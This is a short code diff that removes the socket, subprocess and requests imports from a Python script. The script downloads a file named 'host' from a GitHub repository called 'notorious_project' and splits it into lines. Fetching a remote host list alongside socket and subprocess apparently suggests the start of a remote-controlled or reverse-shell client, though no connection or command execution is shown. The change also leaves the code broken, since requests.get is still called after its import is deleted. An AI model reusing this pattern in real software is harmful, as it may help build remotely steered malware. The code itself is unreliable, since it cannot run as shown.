@@ -1,7 +1,3 @@
-import socket
-import subprocess
-import requests
-
 url = "https://raw.githubusercontent.com/utkuberkaytan/notorious_project/refs/heads/main/host"
 res = requests.get(url)
 lines = res.text.strip().split("\n")
